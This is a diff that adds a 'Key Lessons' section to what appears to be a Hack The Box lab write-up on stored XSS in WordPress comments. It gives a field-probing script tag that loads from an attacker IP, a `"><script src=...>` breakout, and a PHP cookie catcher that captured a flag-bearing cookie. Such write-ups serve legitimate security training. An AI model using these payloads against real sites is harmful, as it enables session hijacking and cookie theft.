@@ -60,3 +60,14 @@ curl -s -X POST "http://<TARGET>/assessment/wp-comments-post.php" \
   -d "comment_post_ID=8&comment_parent=0&submit=Post+Comment"
 ```
 **Result:** Received `GET /index.php?c=wordpress_test_cookie=...;flag=HTB{cr055_5173_5cr1p71n6_n1nj4}`
+
+---
+
+## Key Lessons
+
+- **Read the full page HTML first** — the post ID (`comment_post_ID=8`) is a hidden field; omitting it silently fails the submission.
+- **WordPress rejects XSS in the `author` and `email` fields** — CMS validation blocks payloads there; only inject in `comment` and `url`.
+- **Probe each field with a unique path name** — `<script src=http://<IP>:8000/fieldname>` lets you identify the vulnerable field by which path the PHP server receives.
+- **A plain URL fetch is not script execution** — the `url` field caused the server to fetch a resource (GET /url), but that's not code execution. The `"><script src=...>` breakout is what converts it to JS execution.
+- **Use PHP server, not Python** — the cookie catcher `index.php` runs PHP to log the cookie; `python3 -m http.server` serves static files only and won't execute it.
+- **Flag is in a cookie, not the page** — the flag arrived as part of the stolen cookie string (`flag=HTB{...}`), not as page content. Always check all stolen cookies.
